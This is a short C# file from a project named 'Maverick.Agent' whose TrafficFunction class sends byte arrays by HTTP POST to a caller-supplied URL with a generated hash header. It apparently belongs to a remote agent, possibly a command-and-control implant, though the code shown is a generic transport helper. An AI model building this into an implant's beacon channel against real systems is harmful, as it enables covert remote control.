using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Threading.Tasks;

namespace Maverick.Agent
{
    public class TrafficFunction
    {
        private static readonly HttpClient _http;

        static TrafficFunction()
        {
            _http = new HttpClient();
            _http.DefaultRequestHeaders.Add("X-Request-Hash",CryptoFunction.GetRequestHeaderVallue());
        }

        public static async Task<byte[]> SendDataAsync(string url, byte[] data)
        {
            try
            {
                using (var content = new ByteArrayContent(data))
                {
                    var response = await _http.PostAsync(url, content);
                    response.EnsureSuccessStatusCode();
                    return await response.Content.ReadAsByteArrayAsync();
                }
            }
            catch (Exception ex)
            {
                throw new InvalidOperationException("Data transmission failed.", ex);
            }
        }

    }
}
